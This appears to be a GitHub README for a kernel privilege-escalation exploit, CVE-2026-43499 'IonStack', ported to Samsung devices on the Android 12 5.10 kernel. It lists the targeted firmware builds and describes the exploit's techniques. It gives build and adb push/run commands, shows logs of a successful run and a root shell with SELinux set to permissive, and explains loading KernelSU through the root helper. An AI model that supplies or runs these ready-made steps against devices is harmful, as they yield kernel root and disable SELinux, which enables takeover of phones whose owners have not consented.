# CVE-2026-43499 - Samsung 5.10 Kernel Devices (IonStack)

https://github.com/user-attachments/assets/f3d0858d-f8f5-444f-8ae5-541c2bc744c3

<table>
  <tr>
    <td><img src="https://github.com/user-attachments/assets/9f687fdd-04bc-4ba7-88fe-6ccc26df6253" width="300"></td>
    <td><img src="https://github.com/user-attachments/assets/8837b552-bd18-45f5-9780-94e857b48d33" width="300"></td>
  </tr>
  <tr>
    <td><img src="https://github.com/user-attachments/assets/a5e48699-a7e3-4c7a-96df-c2fbf03c74c5" width="300"></td>
    <td><img src="https://github.com/user-attachments/assets/85c626c8-7fe5-406e-a45f-c76b23d44566" width="300"></td>
  </tr>
</table>

While this repository originated as a device-specific port for the Galaxy S22 Ultra, **the project has since shifted and expanded to support all Samsung devices running the Linux Android 12 5.10 kernel**. 

The exploit framework accommodates both **Qualcomm** (e.g. Snapdragon 8 Gen 1 / SM8450) and **Samsung Exynos** (e.g. Exynos 2200) architectures, adapting kernel layouts, CFI dispatch, KASLR slide derivation, and race choreography to 5.10 GKI structures. Any Samsung device running a 5.10 kernel can be supported by extracting its symbols and struct layouts into a target folder under `src/targets/<TARGET>` using `target_generator`.

## Supported Devices & Targets

The following pre-configured target profiles are included in `src/targets/<TARGET>`. Each profile contains verified kernel offsets, structure layouts, and target configurations for that specific firmware release:

| Device | Model | Target / Build | SoC | Android | Region / Notes |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Galaxy S22** | SM-S901B | `S901BXXSNGZD7` | **Samsung Exynos 2200** | Android 16 | Europe / International |
| **Galaxy S22** | SM-S901E | `S901EXXSEGZE3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Global / Latin America / Asia / Africa |
| **Galaxy S22** | SM-S901U1 | `S901U1UESAGZF3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | USA (Factory Unlocked) |
| **Galaxy S22** | SM-S901U1 | `S901U1UESAGZH3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | USA (Factory Unlocked) |
| **Galaxy S22** | SM-S901U | `S901USQSAGZF3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | USA (Carrier Locked) |
| **Galaxy S22** | SM-S901U | `S901USQSAGZH3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | USA (Carrier Locked) |
| **Galaxy S22** | SM-S901U | `S901USQU2BVK1` | **Qualcomm Snapdragon 8 Gen 1** | Android 13 | USA (Carrier Locked) |
| **Galaxy S22** | SM-S901W | `S901WVLS4DWL3` | **Qualcomm Snapdragon 8 Gen 1** | Android 14 | Canada |
| **Galaxy S22** | SM-S901W | `S901WVLSAGZH3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Canada |
| **Galaxy S22+** | SM-S9060 | `S9060ZCS9GZA1` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | China (CHC) |
| **Galaxy S22+** | SM-S906E | `S906EXXSEGZE3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Global / Latin America / Asia / Africa |
| **Galaxy S22 Ultra** | SM-S908B | `S908BXXSMGZB2` | **Samsung Exynos 2200** | Android 16 | Europe / International |
| **Galaxy S22 Ultra** | SM-S908B | `S908BXXSNGZD7` | **Samsung Exynos 2200** | Android 16 | Europe / International |
| **Galaxy S22 Ultra** | SM-S908E | `S908EXXSEGZE3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Global / Latin America / Asia / Africa |
| **Galaxy S22 Ultra** | SM-S908E | `S908EXXSEGZH4` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Global / Latin America / Asia / Africa |
| **Galaxy S22 Ultra** | SM-S908N | `S908NKSS9GZE5` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | South Korea |
| **Galaxy S22 Ultra** | SM-S908W | `S908WVLS8FYG7` | **Qualcomm Snapdragon 8 Gen 1** | Android 15 | Canada (Baseline Profile) |
| **Galaxy S22 Ultra** | SM-S908W | `S908WVLSAGZE3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Canada |
| **Galaxy S22 Ultra** | SCG14 | `SCG14KDS1EZE3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Japan (au KDDI) |
| **Galaxy Tab S8 Ultra** | SM-X900 | `X900XXU9DYE5` | **Qualcomm Snapdragon 8 Gen 1** | Android 15 | Global (Wi-Fi) |

> [!NOTE]
> The offsets and structure layouts are specific to each target build. Always build with the matching `PROJECT=<TARGET>` parameter for your device's exact firmware version.

## Reference source

This port is based on the exploit implementation published in:

- [NebuSec/CyberMeowfia — IonStack/CVE-2026-43499/exploit](https://github.com/NebuSec/CyberMeowfia/tree/b850d3bddc74c3328d5fbcc0568d21962b55d949/IonStack/CVE-2026-43499/exploit)
- [BuSung-dev/CVE-2026-43499-S25U](https://github.com/BuSung-dev/CVE-2026-43499-S25U)
- Upstream revision used as the porting base: `b850d3bddc74c3328d5fbcc0568d21962b55d949`

Special thanks to:
- [F-19-F/IonStackQuest3](https://github.com/F-19-F/IonStackQuest3)

The upstream Apache License 2.0 is retained in [LICENSE](LICENSE), and attribution requirements are specified in [NOTICE](NOTICE).

## Main porting changes

- Ported exploit from v6.6 kernel (Galaxy S25 Ultra) to the Android v5.10 kernel architecture (supporting all Samsung 5.10 devices across Qualcomm and Exynos).
- Added modular target profiles under `src/targets/<TARGET>` with kernel structure layouts and offset generation via `target_generator`.
- Replaced the pselect race with the `exp32` route (or `exp64` where applicable): futex choreography, 32-bit stack stamp, and `sched_setattr` run in an embedded child stage (`src/exp32/`).
- Added tracefs-based automatic KASLR slide recovery for the Samsung kernel.
- Ported fake PI waiter/task layout, CFI/FOPS stage, and physical read/write primitive for v5.10.
- Added a KDP-safe `system_unbound_wq` user-mode-helper root path and updated runtime SELinux enforcement target to `selinux_state.enforcing`.
- Added a socket-backed root command helper at
  `/data/local/tmp/cve-2026-43499-root`.
- Restores the global ashmem FOPS pointer immediately after establishing the
  arbitrary read/write primitive.
- Retains reclaimed pages in a detached `cve43499-hold` process after success
  so dangling kernel references cannot be recycled into unrelated slab objects.
- Runs failed race attempts in independent child processes and automatically
  retries with a device-tuned delay sequence.

## Build

Set `ANDROID_NDK_HOME` to Android NDK r27+ or a compatible toolchain, then run with your chosen `PROJECT=<TARGET>` from the table above:

```sh
# Example building for Galaxy S22 Ultra (SM-S908W):
make PROJECT=S908WVLS8FYG7 clean preload root-helper

# Or specify any target from the supported device list:
# make PROJECT=S901BXXSNGZD7 clean preload root-helper   # Galaxy S22 (Exynos)
# make PROJECT=S906EXXSEGZE3 clean preload root-helper   # Galaxy S22+ (Snapdragon)
# make PROJECT=X900XXU9DYE5 clean preload root-helper    # Galaxy Tab S8 Ultra
```

To build for a QEMU environment running the Android kernel with a Buildroot filesystem:
- **Buildroot Toolchain Release**: Download toolchain from [sarabpal-dev/qemu Release (samsung-v1)](https://github.com/sarabpal-dev/qemu/releases/tag/samsung-v1)
- **QEMU Kernel Execution Guide**: Setup and run guide at [QEMU Samsung README](https://github.com/sarabpal-dev/qemu/blob/samsung/docs/samsung/README.md)

```sh
make USE_BUILDROOT=1 PROJECT=<TARGET> clean preload root-helper
```

Outputs:

```text
build/<TARGET>/bin/cve-2026-43499
build/<TARGET>/bin/cve-2026-43499-root
build/<TARGET>/bin/cve-exp32 (or cve-exp64 for 64-bit exp targets like BVK1)
```

## Deploy

Push the binaries built for your target to the device:

```sh
export TARGET=S908WVLS8FYG7  # Replace with your target name

adb push build/$TARGET/bin/cve-2026-43499 /data/local/tmp/cve-2026-43499
adb push build/$TARGET/bin/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
# Push the stage binary (cve-exp32 or cve-exp64 depending on target):
if [ -f "build/$TARGET/bin/cve-exp64" ]; then
    adb push build/$TARGET/bin/cve-exp64 /data/local/tmp/cve-exp64
    adb shell chmod 755 /data/local/tmp/cve-exp64
else
    adb push build/$TARGET/bin/cve-exp32 /data/local/tmp/cve-exp32
    adb shell chmod 755 /data/local/tmp/cve-exp32
fi
adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root
```

## Run

Execute the exploit stage to start the root daemon:

```sh
adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"
```

Once successful, pop an interactive root shell from anywhere on the device:

```sh
adb shell "/data/local/tmp/cve-2026-43499-root"
```

Or execute root commands directly:

```sh
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
```

The default run makes up to 16 independent attempts. Each failed child exits
before the next attempt, so its file descriptors and heap-shaping allocations
are released instead of accumulating inside one long-lived exploit process.
The default base delay is `20000` microseconds and the supervisor sweeps the
following sequence twice:

```text
20000, 30000, 50000, 25000, 40000, 15000, 60000, 35000
```

Override the attempt count or base delay when collecting timing data:

```sh
adb shell "EXPLOIT_ATTEMPTS=24 PSELECT_DELAY_USEC=20000 LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"
```

Verified result on `S908WVLS8FYG7`:

```text
[*] root umh result wake=1 complete=1 retval=0 socket=1
[+] pipe-physrw-summary pid=5011 done=1 root=1 kaslr=1 base=ffffffc0080d8000 slide=00000000000d8000
[+] pipe physrw pid=5011 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
[+] stability keeper pid=28206 retaining reclaimed kernel pages
[+] exploit completed attempt=1/16
```

Interactive root shell session:

```text
b0q:/data/local/tmp $ ./cve-2026-43499-root                              
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
:/ # getenforce
Permissive
```

The initial stage is race-based. A child that exits with `root=0`
is retried automatically. Successful execution restores `ashmem_misc.fops`, switches SELinux to permissive, and starts the root helper daemon until the next reboot.

## Persistent root with KernelSU-Next

The exploit above only holds root for the current boot. To get a Manager app and `su`-style control for the rest of the session, load [KernelSU-Next](https://github.com/sarabpal-dev/KernelSU-Next) as a late-load kernel module through the root helper.

1. Download both release assets from [`v3.3.0-android12-5.10`](https://github.com/sarabpal-dev/KernelSU-Next/releases/tag/v3.3.0-android12-5.10):
   - [`KernelSU_Next_v3.3.0-release.apk`](https://github.com/sarabpal-dev/KernelSU-Next/releases/download/v3.3.0-android12-5.10/KernelSU_Next_v3.3.0-release.apk) — Manager app
   - [`kernelsu-android12-5.10.ko`](https://github.com/sarabpal-dev/KernelSU-Next/releases/download/v3.3.0-android12-5.10/kernelsu-android12-5.10.ko) — LKM kernel module

2. Install the Manager APK:

```sh
adb install KernelSU_Next_v3.3.0-release.apk
```

3. Push the module and load it through the root helper obtained above:

```sh
adb push kernelsu-android12-5.10.ko /data/local/tmp/kernelsu-android12-5.10.ko
adb shell "/data/local/tmp/cve-2026-43499-root -c 'insmod /data/local/tmp/kernelsu-android12-5.10.ko'"
```

4. Open the KernelSU Next app on the device — it should detect the loaded module and expose superuser management, module/Zygisk support, and `ksud soft-reboot`.

Since this is a late-loaded LKM (not a patched boot image), it does not survive a reboot — you'll need to re-run the exploit and re-`insmod` the module each time the device restarts.

> [!WARNING]
> **Reliability & Kernel Panic Notice:**
> The race stage is timing-sensitive and currently unreliable—it may fail or cause a kernel panic on most runs. Be patient, as clean boots offer a higher success rate. Future optimizations may be released to improve reliability.

> [!TIP]
> **Stability & Success Rate Recommendations:**
> - **Reboot Device**: For the highest success rate, reboot the device before running the exploit to ensure clean slab/heap state.
> - **Close Background Apps**: Ensure all background applications are closed.
> - **Unlock Screen & Stay Idle**: Keep the device unlocked and do not interact with or use the phone while the exploit is running, as active user input/background tasks can disturb timing and potentially trigger a kernel panic.

Use only on devices you own or are explicitly authorized to test.
